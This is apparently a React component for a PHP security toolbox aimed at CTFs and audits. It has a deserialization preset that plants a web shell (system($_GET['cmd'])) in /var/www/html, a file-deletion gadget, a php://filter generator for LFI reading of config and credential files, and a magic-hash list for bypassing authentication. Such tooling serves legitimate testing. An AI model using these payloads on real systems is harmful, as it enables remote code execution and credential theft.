import React, { useState } from 'react';
import { KNOWN_MAGIC_HASHES, buildStreamFilter, parseSerializedObject } from '../utils/payloads';
import { Wrench, Copy, Check, Filter, Binary, Hash } from 'lucide-react';

export const PayloadToolsView: React.FC = () => {
  const [activeSubTool, setActiveSubTool] = useState<'serializer' | 'stream' | 'magichash'>('serializer');

  // Serializer Tool state
  const [serializedInput, setSerializedInput] = useState<string>(
    'O:10:"LogManager":2:{s:8:"log_file";s:25:"/var/www/html/shell.php";s:7:"message";s:29:"<?php system($_GET[\'cmd\']);?>";}'
  );

  // Stream Tool state
  const [streamFilterType, setStreamFilterType] = useState<'base64' | 'rot13' | 'strip_tags'>('base64');
  const [streamResource, setStreamResource] = useState<string>('config.php');

  // Copied state
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const parsedSerial = parseSerializedObject(serializedInput);
  const generatedStreamUrl = buildStreamFilter(streamFilterType, streamResource);

  return (
    <div className="space-y-6">
      {/* Intro Header */}
      <div className="p-5 bg-slate-900 border border-slate-800 rounded-xl space-y-2">
        <div className="flex items-center gap-2">
          <Wrench className="w-5 h-5 text-indigo-400" />
          <h2 className="text-base font-bold text-white">PHP Security Payload & Utility Toolbox</h2>
        </div>
        <p className="text-xs text-slate-300 leading-relaxed max-w-3xl">
          Craft, decode, and inspect specialized payloads used in PHP security research, CTFs, and application audits. Inspect PHP serialization zvals, construct stream wrapper filter chains, and reference known magic collision hashes.
        </p>
      </div>

      {/* Subtool Tabs */}
      <div className="flex items-center gap-1 p-1 bg-slate-900 border border-slate-800 rounded-lg w-fit">
        <button
          onClick={() => setActiveSubTool('serializer')}
          className={`flex items-center gap-2 px-3.5 py-1.5 text-xs font-medium rounded-md whitespace-nowrap transition-colors ${
            activeSubTool === 'serializer'
              ? 'bg-indigo-600 text-white shadow-xs'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Binary className="w-3.5 h-3.5" />
          <span>Object Deserialization Inspector</span>
        </button>

        <button
          onClick={() => setActiveSubTool('stream')}
          className={`flex items-center gap-2 px-3.5 py-1.5 text-xs font-medium rounded-md whitespace-nowrap transition-colors ${
            activeSubTool === 'stream'
              ? 'bg-indigo-600 text-white shadow-xs'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Filter className="w-3.5 h-3.5" />
          <span>php://filter Generator</span>
        </button>

        <button
          onClick={() => setActiveSubTool('magichash')}
          className={`flex items-center gap-2 px-3.5 py-1.5 text-xs font-medium rounded-md whitespace-nowrap transition-colors ${
            activeSubTool === 'magichash'
              ? 'bg-indigo-600 text-white shadow-xs'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Hash className="w-3.5 h-3.5" />
          <span>Magic Hashes Database</span>
        </button>
      </div>

      {/* Subtool 1: Serializer Inspector */}
      {activeSubTool === 'serializer' && (
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
          <div className="space-y-1">
            <h3 className="text-sm font-bold text-white">PHP Serialized Object Parser</h3>
            <p className="text-xs text-slate-400">
              Paste any PHP serialized string to parse its class definition, property counts, and member variables.
            </p>
          </div>

          <div>
            <label className="block text-xs font-medium text-slate-400 mb-1">
              Serialized String:
            </label>
            <textarea
              rows={3}
              value={serializedInput}
              onChange={(e) => setSerializedInput(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 focus:border-indigo-500 rounded-lg p-3 font-mono text-xs text-indigo-200 outline-none"
            />
          </div>

          {/* Quick Presets */}
          <div className="flex flex-wrap gap-2 text-xs">
            <span className="text-slate-500 py-1">Presets:</span>
            <button
              onClick={() => setSerializedInput('O:10:"LogManager":2:{s:8:"log_file";s:25:"/var/www/html/shell.php";s:7:"message";s:29:"<?php system($_GET[\'cmd\']);?>";}')}
              className="px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded"
            >
              LogManager Dropper
            </button>
            <button
              onClick={() => setSerializedInput('O:11:"FileCleanup":1:{s:8:"filepath";s:25:"/var/lock/admin_disabled";}')}
              className="px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded"
            >
              FileCleanup Unlinker
            </button>
            <button
              onClick={() => setSerializedInput('O:8:"stdClass":2:{s:4:"user";s:5:"admin";s:4:"role";s:10:"superadmin";}')}
              className="px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded"
            >
              Generic stdClass
            </button>
          </div>

          {/* Output Parser */}
          <div className="p-4 bg-slate-950 border border-slate-800 rounded-lg space-y-3">
            <div className="flex items-center justify-between text-xs">
              <span className="font-semibold text-slate-300">Parser Inspection Result:</span>
              <span className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                parsedSerial.valid ? 'bg-emerald-950 text-emerald-400 border border-emerald-800' : 'bg-rose-950 text-rose-400'
              }`}>
                {parsedSerial.valid ? 'VALID PHP SERIALIZATION' : 'FORMAT ERROR'}
              </span>
            </div>

            {parsedSerial.valid ? (
              <div className="space-y-2 text-xs">
                <div className="flex items-center gap-2">
                  <span className="text-slate-500">Target Class:</span>
                  <span className="font-mono text-indigo-300 font-bold">{parsedSerial.className}</span>
                </div>

                <div className="text-slate-400 font-medium">Injected Properties:</div>
                <div className="border border-slate-800 rounded overflow-hidden">
                  <table className="w-full text-left font-mono text-[11px]">
                    <thead className="bg-slate-900 text-slate-400">
                      <tr>
                        <th className="py-2 px-3">Property Name</th>
                        <th className="py-2 px-3">Assigned Value</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800">
                      {Object.entries(parsedSerial.properties || {}).map(([k, v]) => (
                        <tr key={k}>
                          <td className="py-2 px-3 text-indigo-400 font-semibold">{k}</td>
                          <td className="py-2 px-3 text-slate-300 break-all">{v}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            ) : (
              <div className="text-xs text-rose-300">
                {parsedSerial.error}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Subtool 2: Stream Filter Generator */}
      {activeSubTool === 'stream' && (
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
          <div className="space-y-1">
            <h3 className="text-sm font-bold text-white">PHP Stream Wrapper Filter Builder</h3>
            <p className="text-xs text-slate-400">
              Generate stream wrapper URIs for Local File Inclusion (LFI) source code reading and data stream transformations.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
            <div>
              <label className="block text-slate-400 mb-1 font-medium">Filter Type:</label>
              <div className="flex flex-col gap-1.5">
                {[
                  { id: 'base64', name: 'convert.base64-encode (Source Code Exfiltration)' },
                  { id: 'rot13', name: 'string.rot13 (ROT13 Obfuscation)' },
                  { id: 'strip_tags', name: 'string.strip_tags (HTML/PHP Tag Stripper)' }
                ].map((f) => (
                  <button
                    key={f.id}
                    onClick={() => setStreamFilterType(f.id as 'base64' | 'rot13' | 'strip_tags')}
                    className={`p-2 rounded text-left border transition-colors ${
                      streamFilterType === f.id
                        ? 'bg-indigo-950/60 border-indigo-600 text-white font-medium'
                        : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    {f.name}
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-3">
              <div>
                <label className="block text-slate-400 mb-1 font-medium">Target Resource Name / Path:</label>
                <input
                  type="text"
                  value={streamResource}
                  onChange={(e) => setStreamResource(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 focus:border-indigo-500 rounded p-2 text-xs font-mono text-indigo-300 outline-none"
                  placeholder="e.g. config.php or /var/www/html/secret"
                />
              </div>

              <div className="flex flex-wrap gap-1.5">
                {['config.php', 'index.php', 'db.php', 'credentials.php'].map((res) => (
                  <button
                    key={res}
                    onClick={() => setStreamResource(res)}
                    className="text-[11px] px-2 py-0.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded"
                  >
                    {res}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Result Output */}
          <div className="p-4 bg-slate-950 border border-slate-800 rounded-lg space-y-2">
            <div className="flex items-center justify-between text-xs">
              <span className="font-semibold text-slate-300">Generated Stream Wrapper Payload:</span>
              <button
                onClick={() => handleCopy(generatedStreamUrl, 'stream-copy')}
                className="flex items-center gap-1 px-2.5 py-1 text-slate-300 bg-slate-800 hover:bg-slate-700 rounded text-[11px]"
              >
                {copiedId === 'stream-copy' ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-emerald-400" />
                    <span className="text-emerald-400">Copied</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy URL</span>
                  </>
                )}
              </button>
            </div>
            <div className="p-3 bg-slate-900 rounded font-mono text-xs text-emerald-400 break-all select-all border border-slate-800">
              {generatedStreamUrl}
            </div>
          </div>
        </div>
      )}

      {/* Subtool 3: Magic Hashes Database */}
      {activeSubTool === 'magichash' && (
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
          <div className="space-y-1">
            <h3 className="text-sm font-bold text-white">PHP Magic Hash Collision Database</h3>
            <p className="text-xs text-slate-400 leading-relaxed">
              In PHP loose comparison (<code className="text-indigo-300">==</code>), any string whose hash begins with <code className="text-indigo-300">0e</code> followed exclusively by numerical digits is treated as scientific notation for <code className="text-emerald-400">float(0.0)</code>. If an application compares an attacker input hash to another magic hash with <code className="text-indigo-300">==</code>, authentication is bypassed!
            </p>
          </div>

          <div className="border border-slate-800 rounded-lg overflow-hidden">
            <table className="w-full text-left text-xs">
              <thead className="bg-slate-950 text-slate-400 border-b border-slate-800 font-semibold text-[11px] uppercase tracking-wider">
                <tr>
                  <th className="py-2.5 px-3">Type</th>
                  <th className="py-2.5 px-3">Plaintext Input</th>
                  <th className="py-2.5 px-3">Computed Hash (0e...)</th>
                  <th className="py-2.5 px-3">PHP Float Interpretation</th>
                  <th className="py-2.5 px-3 text-right">Action</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800 bg-slate-900/60 font-mono text-[11px]">
                {KNOWN_MAGIC_HASHES.map((item, idx) => (
                  <tr key={idx} className="hover:bg-slate-800/40">
                    <td className="py-2.5 px-3 text-indigo-400 font-bold">{item.type}</td>
                    <td className="py-2.5 px-3 text-slate-200 font-bold">{item.input}</td>
                    <td className="py-2.5 px-3 text-amber-300">{item.hash}</td>
                    <td className="py-2.5 px-3 text-slate-400">{item.scientificNotation}</td>
                    <td className="py-2.5 px-3 text-right">
                      <button
                        onClick={() => handleCopy(item.input, `hash-${idx}`)}
                        className="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded text-[10px]"
                      >
                        {copiedId === `hash-${idx}` ? 'Copied' : 'Copy Input'}
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
};
